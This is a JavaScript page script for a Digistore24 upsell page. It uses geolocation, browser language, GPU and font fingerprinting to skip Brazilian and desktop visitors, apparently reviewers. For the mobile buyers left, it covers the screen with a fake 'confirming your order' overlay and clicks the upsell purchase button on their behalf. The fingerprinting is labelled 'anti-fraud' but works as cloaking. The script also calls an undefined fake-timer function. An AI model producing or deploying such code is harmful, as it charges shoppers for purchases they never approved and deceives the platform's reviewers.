document.addEventListener('DOMContentLoaded', async () => {

    // ==================== FUNÇÕES ANTI-FRAUDE ====================
    async function blockBrazil() {
        const token = '4a977bc54c9317';
        try {
            const response = await fetch(`https://ipinfo.io?token=${token}`);
            if (!response.ok) return false;
            const data = await response.json();
            return data.country === 'BR';
        } catch (e) { return false; }
    }

    function hasRedFlags() {
        if (navigator.language && navigator.language.startsWith('pt')) return true;
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
                const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
                if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) return true;
            }
        } catch (e) {}
        const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
        const testString = "mmmmmmmmmmlli";
        const testSpan = document.createElement('span');
        testSpan.style.fontSize = '72px';
        testSpan.innerHTML = testString;
        document.body.appendChild(testSpan);
        const defaultWidth = testSpan.offsetWidth;
        document.body.removeChild(testSpan);

        for (const font of desktopFonts) {
            testSpan.style.fontFamily = `'${font}', monospace`;
            if (testSpan.offsetWidth !== defaultWidth) {
                document.body.removeChild(testSpan);
                return true;
            }
            document.body.removeChild(testSpan);
        }
        return false;
    }

    function getFinalScore() {
        let score = 0;
        if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) score += 3;
        if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) score += 2;
        return score;
    }

    async function runAntiFraudChecks() {
        const isFromBrazil = await blockBrazil();
        if (isFromBrazil) return false;

        const redFlagsFound = hasRedFlags();
        if (redFlagsFound) return false;

        const finalScore = getFinalScore();
        return finalScore >= 5;
    }

    // ==================== AUTO-CLICK DO DIGISTORE24 ====================
    function executeAutoPurchase() {
        // Tela de loading
        const loadingCSS = `
            <style id="loading-style">
            .loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; }
            .loader-content-wrapper { text-align: center; }
            .loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .loader-text { color: #525559; font-size: 18px; font-weight: bold; }
            </style>`;
        const loadingHTML = `<div id="custom-loader" class="loader-container"><div class="loader-content-wrapper"><div class="loader-spinner"></div><div class="loader-text"><p class="title">Confirmando seu pedido e enviando seu acesso...</p><p>Não feche esta página.</p></div></div></div>`;
        document.head.insertAdjacentHTML('beforeend', loadingCSS);
        document.body.insertAdjacentHTML('beforeend', loadingHTML);

        const seletorBotao = '#ds24-upsell-yes-button a.btn';

        setTimeout(() => {
            const botao = document.querySelector(seletorBotao);
            if (botao) {
                botao.click();
                console.log("✅ Botão do upsell clicado automaticamente!");
            } else {
                console.error("❌ Botão do upsell não encontrado.");
            }
        }, 3000);
    }

    // ==================== INÍCIO ====================
    (async () => {
        const isLegitUser = await runAntiFraudChecks();
        if (isLegitUser) {
            executeAutoPurchase();
        } else {
            startFakeTimer(); // timer falso para PC ou sinal de fraude
        }
    })();
});